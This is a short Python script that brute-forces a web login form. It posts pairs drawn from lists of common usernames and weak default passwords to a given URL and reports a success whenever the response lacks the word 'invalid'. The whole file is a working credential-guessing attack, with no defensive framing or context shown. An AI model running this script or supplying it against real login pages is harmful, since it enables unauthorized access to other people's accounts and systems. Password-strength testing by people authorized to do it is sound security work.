import requests

def brute_force_login(url):
    usernames = ["admin", "user", "test"]
    passwords = ["admin", "123456", "password", "letmein"]

    for username in usernames:
        for password in passwords:
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
            if "invalid" not in response.text.lower():
                print(f"[+] Login Success with {username}:{password}")
                return
            else:
                print(f"[-] Failed: {username}:{password}")
    print("[!] Brute force completed. No valid credentials found.")
